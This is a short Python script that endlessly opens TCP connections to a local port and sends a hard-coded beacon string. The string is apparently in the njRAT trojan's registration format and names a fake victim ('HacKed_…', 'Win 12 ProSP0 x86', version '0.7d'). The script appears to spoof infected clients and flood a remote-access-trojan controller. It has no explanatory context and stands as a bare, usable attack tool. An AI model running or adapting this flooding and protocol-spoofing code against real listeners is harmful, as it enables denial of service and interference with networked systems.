import socket
a = "127.0.0.1"
c = "7777"
b = "178\x00ll|'|'|SGFjS2VkXzc2MTNBMTJG|'|'|vzlomjopy|'|'|ser|'|'|14-05-27|'|'||'|'|Win 12 ProSP0 x86|'|'|Yes|'|'|0.7d|'|'|..|'|'|UHJvZ3JhbSBNYW5hZ2VyAA==|'|'|".encode()

 
while 1 : 
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((a , int(c)))
    s.send(b)
    
    s.close()
    s = socket.socket()
    s.connect((a , int(c)))
    s.send(b)
    
    s.send(b)
    s.close()
    s = socket.socket()
    s.connect((a , int(c)))
    s.send(b)
